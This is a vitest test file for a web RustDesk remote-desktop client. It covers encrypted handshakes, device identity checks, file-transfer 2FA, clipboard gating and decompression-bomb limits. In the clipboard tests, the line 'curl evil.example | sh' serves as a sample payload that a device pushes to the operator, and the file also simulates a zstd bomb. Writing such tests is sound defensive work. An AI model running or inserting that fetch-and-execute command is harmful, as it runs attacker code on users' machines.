/**
 * The RustDesk client (src/lib/remote/client/client.ts and
 * file-connection.ts) against a fake device: messages go in through the
 * relay handler, what the client sends is caught at the relay socket. No
 * rendezvous, relay or device runs.
 */
import { beforeEach, describe, expect, test, vi } from 'vitest';
import nacl from 'tweetnacl';
import { RDClient } from '../../../src/lib/remote/client/client.ts';
import { RDClipboard } from '../../../src/lib/remote/client/clipboard.ts';
import { RDCompress } from '../../../src/lib/remote/client/compress.ts';
import { RDFileConnection } from '../../../src/lib/remote/client/file-connection.ts';
import { LoginResponse } from '../../../src/lib/remote/client/generated/protos.ts';
import { RemoteTargetSession } from '../../../src/lib/remote/client/remote-target.ts';

const g = { RDClient, RDFileConnection, RDClipboard, RDCompress };

beforeEach(() => {
	// jsdom has no 2D canvas; the renderer copes with a missing context
	vi.spyOn(HTMLCanvasElement.prototype, 'getContext').mockReturnValue(null);
});

async function client(opts: Record<string, unknown> = {}) {
	const c = new g.RDClient(document.createElement('canvas'), { deviceId: '900100012', ...opts });
	await c.proto.load();
	return c;
}

describe('watch-only guest', () => {
	test('asks the device to ignore the keyboard and never starts input capture', async () => {
		const c = await client({ viewOnly: true });
		expect(c.viewOnly).toBe(true);
		const sent: Record<string, unknown>[] = [];
		c._sendPeerMessage = (m: Record<string, unknown>) => sent.push(m);
		c._keyExchangeDone = true;
		await c.authenticate('pw');
		const login = sent.find((m) => m.loginRequest) as { loginRequest: { option: Record<string, unknown> } };
		expect(login.loginRequest.option.disableKeyboard).toBe(2);

		const start = vi.spyOn(c.input, 'start');
		c._state = 'streaming';
		c.setSessionActive(true);
		c.setViewOnly(false);
		expect(start).not.toHaveBeenCalled();
		expect(c.viewOnly).toBe(true);
	});

	test('an operator session leaves the keyboard option out', async () => {
		const c = await client();
		const sent: Record<string, unknown>[] = [];
		c._sendPeerMessage = (m: Record<string, unknown>) => sent.push(m);
		c._keyExchangeDone = true;
		await c.authenticate('pw');
		const login = sent.find((m) => m.loginRequest) as { loginRequest: { option: Record<string, unknown> } };
		expect(login.loginRequest.option.disableKeyboard).toBeUndefined();
	});
});

/* ── A fake device behind the relay ── */

type SignKeys = { publicKey: Uint8Array; secretKey: Uint8Array };
// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Proto = any;

const b64 = (b: Uint8Array) => btoa(String.fromCharCode(...b));

/**
 * A server's and a device's keys and the two signed blobs the client
 * checks: RelayResponse.pk (the device's identity key, signed by the
 * server) and SignedId (the device's session key, signed by its identity)
 */
function device(proto: Proto, o: { id?: string; relaySigner?: SignKeys; idSigner?: SignKeys } = {}) {
	const server: SignKeys = nacl.sign.keyPair();
	const identity: SignKeys = nacl.sign.keyPair();
	const box = nacl.box.keyPair();
	const idPk = (id: string, pk: Uint8Array) =>
		proto.types.IdPk.encode(proto.types.IdPk.create({ id, pk })).finish() as Uint8Array;
	const id = o.id ?? '900100012';
	const relayPk = nacl.sign(idPk(id, identity.publicKey), (o.relaySigner ?? server).secretKey);
	const signedId = nacl.sign(idPk(id, box.publicKey), (o.idSigner ?? identity).secretKey);
	let key: Uint8Array | null = null;
	let seq = 0;
	return {
		serverPubKey: b64(server.publicKey),
		relayPk,
		signedIdFrame: proto.serializeMessage({ signedId: { id: signedId } }) as Uint8Array,
		plain: (msg: unknown) => proto.serializeMessage(msg) as Uint8Array,
		/** Read the client's PublicKey message and open the session key with the device's box key */
		takeKey(frame: Uint8Array) {
			const pk = proto.decodeMessage(frame).publicKey;
			key = nacl.box.open(pk.symmetricValue, new Uint8Array(24), pk.asymmetricValue, box.secretKey);
			return key;
		},
		sealed(msg: unknown) {
			const nonce = new Uint8Array(24);
			nonce[0] = ++seq;
			return nacl.secretbox(proto.serializeMessage(msg), nonce, key!) as Uint8Array;
		},
		/** Decrypt the client's n-th encrypted frame (the relay delivers it as it was sent) */
		open(frame: Uint8Array, n: number) {
			const nonce = new Uint8Array(24);
			nonce[0] = n;
			const plain = nacl.secretbox.open(frame, nonce, key!) as Uint8Array | null;
			return plain && proto.decodeMessage(plain);
		}
	};
}
type Device = ReturnType<typeof device>;

const HASH = { hash: { salt: 'salt', challenge: 'challenge' } };

async function relayClient() {
	const c = await client();
	const sent: Uint8Array[] = [];
	c.conn.sendRelay = (d: Uint8Array) => sent.push(d);
	const errors: string[] = [];
	const prompts: unknown[] = [];
	c.on('error', (m: string) => errors.push(m));
	c.on('password_required', () => prompts.push(1));
	c._state = 'waiting_password';
	return { c, sent, errors, prompts };
}
type RelayClient = Awaited<ReturnType<typeof relayClient>>;

/** The relay answer carried the server-signed key and the viewer the server key */
function trust(t: RelayClient, d: Device) {
	t.c.opts.serverPubKey = d.serverPubKey;
	t.c._peerSignedPk = d.relayPk;
}

describe('device identity and encryption (main session)', () => {
	// A RustDesk device sends its SignedId only when the relay request asks for
	// a secure connection; without the flag its first message is the plaintext
	// password prompt, which the client refuses.
	test('the relay request asks the device for a secure connection', async () => {
		const c = await client();
		const request = c.proto.buildRequestRelay('900100012', 'uuid', 'relay.example', 'key');
		const onWire = c.proto.decodeRendezvous(c.proto.serializeRendezvous(request));
		expect(onWire.requestRelay?.secure).toBe(true);
	});

	test('a device that proves its identity gets the session key and its encrypted password prompt shows', async () => {
		const t = await relayClient();
		const d = device(t.c.proto);
		trust(t, d);
		t.c._handleRelayMessage(d.signedIdFrame);
		// The client answers the SignedId with its key at once
		expect(t.sent).toHaveLength(1);
		expect(d.takeKey(t.sent[0]!)).not.toBeNull();
		// Session info claims encryption only once the device has encrypted
		expect(t.c.encrypted).toBe(false);
		t.c._handleRelayMessage(d.sealed(HASH));
		expect(t.c.encrypted).toBe(true);
		expect(t.errors).toEqual([]);
		expect(t.prompts).toHaveLength(1);
		expect(t.c.state).toBe('waiting_password');
	});

	const refused: [string, (t: RelayClient) => void][] = [
		[
			'no SignedId: a plaintext password prompt comes first',
			(t) => {
				const d = device(t.c.proto);
				trust(t, d);
				t.c._handleRelayMessage(d.plain(HASH));
			}
		],
		[
			'no server key to check the device against',
			(t) => {
				const d = device(t.c.proto);
				trust(t, d);
				t.c.opts.serverPubKey = '';
				t.c._handleRelayMessage(d.signedIdFrame);
			}
		],
		[
			'no server-signed key of the device in the relay answer',
			(t) => {
				const d = device(t.c.proto);
				trust(t, d);
				t.c._peerSignedPk = null;
				t.c._handleRelayMessage(d.signedIdFrame);
			}
		],
		[
			'the device key signed by another server',
			(t) => {
				const d = device(t.c.proto, { relaySigner: nacl.sign.keyPair() });
				trust(t, d);
				t.c._handleRelayMessage(d.signedIdFrame);
			}
		],
		[
			'a SignedId not signed by the device key',
			(t) => {
				const d = device(t.c.proto, { idSigner: nacl.sign.keyPair() });
				trust(t, d);
				t.c._handleRelayMessage(d.signedIdFrame);
			}
		],
		[
			'a device that answers for another ID',
			(t) => {
				const d = device(t.c.proto, { id: '900100099' });
				trust(t, d);
				t.c._handleRelayMessage(d.signedIdFrame);
			}
		],
		[
			'plaintext after the SignedId',
			(t) => {
				const d = device(t.c.proto);
				trust(t, d);
				t.c._handleRelayMessage(d.signedIdFrame);
				t.c._handleRelayMessage(d.plain(HASH));
			}
		]
	];

	test.each(refused)('ends the connection before the password prompt: %s', async (_name, run) => {
		vi.spyOn(console, 'error').mockImplementation(() => {});
		const t = await relayClient();
		run(t);
		expect(t.prompts).toEqual([]);
		expect(t.errors).toHaveLength(1);
		expect(t.errors[0]).toMatch(/^Handshake failed: /);
		expect(t.c.state).toBe('error');
	});

	test('no password goes out before the session is encrypted', async () => {
		vi.spyOn(console, 'error').mockImplementation(() => {});
		const t = await relayClient();
		await t.c.authenticate('secret');
		expect(t.sent).toEqual([]);
		expect(t.errors[0]).toMatch(/^Handshake failed: /);
	});
});

describe('device identity and encryption (file transfer session)', () => {
	async function fileConn(serverPubKey: string) {
		const proto: Proto = (await client()).proto;
		const f = new g.RDFileConnection({ deviceId: '900100012', serverPubKey, proto });
		const sent: Uint8Array[] = [];
		f.conn.sendRelay = (d: Uint8Array) => sent.push(d);
		const login = f._waitForLogin('pw') as Promise<void>;
		login.catch(() => {});
		return { f, sent, login, proto };
	}
	const isLogin = (proto: Proto, frame: Uint8Array) => {
		try {
			return !!proto.decodeMessage(frame).loginRequest;
		} catch {
			return false;
		}
	};

	test('a device that proves its identity gets the key, and the login goes out encrypted', async () => {
		const d = device((await client()).proto);
		const t = await fileConn(d.serverPubKey);
		t.f._peerSignedPk = d.relayPk;
		t.f._handleRelayMessage(d.signedIdFrame);
		expect(t.sent).toHaveLength(1);
		d.takeKey(t.sent[0]!);
		t.f._handleRelayMessage(d.sealed(HASH));
		await vi.waitFor(() => expect(t.sent).toHaveLength(2));
		expect(isLogin(t.proto, t.sent[1]!)).toBe(false);
		t.f._handleRelayMessage(d.sealed({ loginResponse: { peerInfo: {} } }));
		await expect(t.login).resolves.toBeUndefined();
		expect(d.open(t.sent[1]!, 1)?.loginRequest).toBeTruthy();
	});

	test('file actions after the login go out as one encrypted message each, with no length header of their own', async () => {
		const d = device((await client()).proto);
		const t = await fileConn(d.serverPubKey);
		t.f._peerSignedPk = d.relayPk;
		t.f._handleRelayMessage(d.signedIdFrame);
		d.takeKey(t.sent[0]!);
		t.f._handleRelayMessage(d.sealed(HASH));
		await vi.waitFor(() => expect(t.sent).toHaveLength(2));
		t.f._handleRelayMessage(d.sealed({ loginResponse: { peerInfo: {} } }));
		await t.login;
		t.f._setState('ready');
		t.f.sendMessage({ fileAction: { readDir: { path: '/home', includeHidden: false } } });
		expect(t.sent).toHaveLength(3);
		expect(d.open(t.sent[2]!, 2)?.fileAction?.readDir?.path).toBe('/home');
	});

	test.each([
		['no SignedId', (d: Device) => [d.plain(HASH)], (d: Device) => d.serverPubKey],
		['no server key', (d: Device) => [d.signedIdFrame], () => ''],
		[
			'plaintext after the SignedId',
			(d: Device) => [d.signedIdFrame, d.plain(HASH)],
			(d: Device) => d.serverPubKey
		]
	])('ends the session before the login: %s', async (_name, frames, key) => {
		const d = device((await client()).proto);
		const t = await fileConn(key(d));
		t.f._peerSignedPk = d.relayPk;
		for (const fr of frames(d)) t.f._handleRelayMessage(fr);
		await expect(t.login).rejects.toThrow(/^Handshake failed: /);
		expect(t.sent.some((s) => isLogin(t.proto, s))).toBe(false);
	});

	test('a SignedId for another ID ends the session', async () => {
		const d = device((await client()).proto, { id: '900100099' });
		const t = await fileConn(d.serverPubKey);
		t.f._peerSignedPk = d.relayPk;
		t.f._handleRelayMessage(d.signedIdFrame);
		await expect(t.login).rejects.toThrow(/^Handshake failed: /);
	});
});

describe('device clipboard', () => {
	const entry = () => ({ content: new TextEncoder().encode('curl evil.example | sh'), format: 0 });

	test('Disable clipboard keeps the device clipboard out of the operator clipboard, also when set before streaming', async () => {
		const c = await client();
		const write = vi.spyOn(g.RDClipboard, 'writeLocalRich').mockResolvedValue({ ok: true });
		c.setDisableClipboard(true);
		c._state = 'streaming';
		await c._applyRemoteClipboard([entry()]);
		expect(write).not.toHaveBeenCalled();

		c.setDisableClipboard(false);
		await c._applyRemoteClipboard([entry()]);
		expect(write).toHaveBeenCalledOnce();
	});

	test('a background tab does not decode the device clipboard at all', async () => {
		const c = await client();
		const decode = vi.spyOn(g.RDClipboard, 'decodeEntries');
		c._state = 'streaming';
		c.setSessionActive(false);
		await c._applyRemoteClipboard([entry()]);
		expect(decode).not.toHaveBeenCalled();
	});

	test('a compressed entry is inflated in chunks and given up past 16 MB', async () => {
		let pulled = 0;
		// A zstd stream that would inflate to 64 MB, one 1 MB chunk per read
		class Bomb {
			writable = new WritableStream();
			readable = new ReadableStream({
				pull(ctl) {
					if (pulled++ >= 64) ctl.close();
					else ctl.enqueue(new Uint8Array(1 << 20));
				}
			});
		}
		vi.stubGlobal('DecompressionStream', Bomb);
		const zstd = new Uint8Array([0x28, 0xb5, 0x2f, 0xfd, 1, 2, 3]);
		try {
			expect(await g.RDClipboard.decodeEntry({ content: zstd, compress: true, format: 0 })).toBeNull();
			expect(pulled).toBeLessThan(20);
			pulled = 0;
			await expect(g.RDCompress.decompressZstd(zstd, { force: true, maxBytes: 4 << 20 })).rejects.toThrow(
				/larger than/
			);
			expect(pulled).toBeLessThan(8);
		} finally {
			vi.unstubAllGlobals();
		}
	});
});

describe('RDP and VNC gateway socket', () => {
	/** A browser WebSocket's binary delivery: a Blob unless binaryType asks for an ArrayBuffer */
	class GatewaySocket {
		static last: GatewaySocket | null = null;
		binaryType: BinaryType = 'blob';
		onopen: (() => void) | null = null;
		onmessage: ((ev: { data: unknown }) => void) | null = null;
		onerror: (() => void) | null = null;
		onclose: (() => void) | null = null;
		readyState = 1;
		constructor() {
			GatewaySocket.last = this;
		}
		send() {}
		close() {}
		binary(text: string) {
			// ASCII as bytes of this realm (jsdom's TextEncoder gives Node's)
			const bytes = Uint8Array.from(text, (c) => c.charCodeAt(0));
			this.onmessage?.({ data: this.binaryType === 'arraybuffer' ? bytes.buffer : new Blob([bytes]) });
		}
	}

	test('reads the instructions the gateway sends as binary messages', async () => {
		vi.stubGlobal('WebSocket', Object.assign(GatewaySocket, { OPEN: 1 }));
		try {
			const s = new RemoteTargetSession(document.createElement('canvas'), { deviceId: 'target-1' });
			await s.authenticate('pw');
			GatewaySocket.last!.binary('5.ready,4.abcd;');
			expect(s.state).toBe('streaming');
			s.disconnect();
		} finally {
			vi.unstubAllGlobals();
		}
	});
});

describe('RDP and VNC clipboard', () => {
	const Session = RemoteTargetSession;

	function clipboardStream(s: RemoteTargetSession) {
		s._handle(['clipboard', '1', 'text/plain']);
		s._handle(['blob', '1', btoa('curl evil.example | sh')]);
		s._handle(['end', '1']);
	}

	test('writes to the operator clipboard only for the active tab and with the clipboard on', () => {
		const writeText = vi.fn(async () => {});
		Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
		const s = new Session(document.createElement('canvas'), {});
		s.setDisableClipboard(true);
		clipboardStream(s);
		s.setDisableClipboard(false);
		s.setSessionActive(false);
		clipboardStream(s);
		expect(writeText).not.toHaveBeenCalled();
		s.setSessionActive(true);
		clipboardStream(s);
		expect(writeText).toHaveBeenCalledWith('curl evil.example | sh');
	});
});

describe('a second factor on the file transfer session', () => {
	test('stays with the file sheet: the desktop session neither asks nor gets the code', async () => {
		vi.spyOn(g.RDFileConnection.prototype, 'connect').mockResolvedValue(undefined);
		const c = await client();
		c._state = 'streaming';
		const mainAsk = vi.fn();
		const mainError = vi.fn();
		const fileAsk = vi.fn();
		const fileError = vi.fn();
		c.on('2fa_required', mainAsk);
		c.on('2fa_error', mainError);
		c.on('login_error', mainError);
		c.on('file_2fa_required', fileAsk);
		c.on('file_2fa_error', fileError);
		c.on('file_login_error', fileError);
		const mainSend = vi.spyOn(c, '_sendPeerMessage');
		await c.ensureFileConnection();
		const fc = c._fileConnection!;
		const fileSend = vi.spyOn(fc, 'submit2FA').mockImplementation(() => {});

		fc._emit('2fa_required');
		fc._emit('2fa_error', 'Wrong 2FA Code');
		fc._emit('login_error', 'Wrong Password');
		expect(mainAsk).not.toHaveBeenCalled();
		expect(mainError).not.toHaveBeenCalled();
		expect(fileAsk).toHaveBeenCalledOnce();
		expect(fileError.mock.calls).toEqual([['Wrong 2FA Code'], ['Wrong Password']]);

		c.submitFile2FA('123456');
		expect(fileSend).toHaveBeenCalledWith('123456');
		expect(mainSend).not.toHaveBeenCalled();
		expect(c.state).toBe('streaming');
	});
});

describe('the file transfer session asks for a second factor', () => {
	async function fileLogin() {
		const proto: Proto = (await client()).proto;
		const f = new g.RDFileConnection({ deviceId: '900100012', proto });
		f.conn.sendRelay = () => {};
		const seen: string[] = [];
		for (const ev of ['2fa_required', '2fa_error', 'login_error']) f.on(ev, () => seen.push(ev));
		let outcome = 'pending';
		const login = (f._waitForLogin('pw') as Promise<void>).then(
			() => (outcome = 'signed in'),
			(e: Error) => (outcome = e.message)
		);
		return { f, seen, login, outcome: () => outcome };
	}

	test('a device that asks for the verification code gets the code prompt, not a login error', async () => {
		const t = await fileLogin();
		t.f._handleLoginResponse(LoginResponse.fromObject({ error: 'Please enter the verification code' }));
		await Promise.resolve();
		expect(t.seen).toEqual(['2fa_required']);
		expect(t.outcome()).toBe('pending');
	});

	test('the login waits while the operator types the code, then for the answer to it', async () => {
		vi.useFakeTimers();
		try {
			const t = await fileLogin();
			t.f._handleLoginResponse(LoginResponse.fromObject({ error: '2FA Required' }));
			await vi.advanceTimersByTimeAsync(120_000);
			expect(t.outcome()).toBe('pending');
			t.f.submit2FA('123456');
			await vi.advanceTimersByTimeAsync(29_000);
			expect(t.outcome()).toBe('pending');
			t.f._handleLoginResponse(LoginResponse.fromObject({}));
			await t.login;
			expect(t.outcome()).toBe('signed in');

			const silent = await fileLogin();
			silent.f._handleLoginResponse(LoginResponse.fromObject({ error: '2FA Required' }));
			silent.f.submit2FA('123456');
			await vi.advanceTimersByTimeAsync(30_000);
			expect(silent.outcome()).toBe('File transfer login timeout (30s)');
		} finally {
			vi.useRealTimers();
		}
	});
});
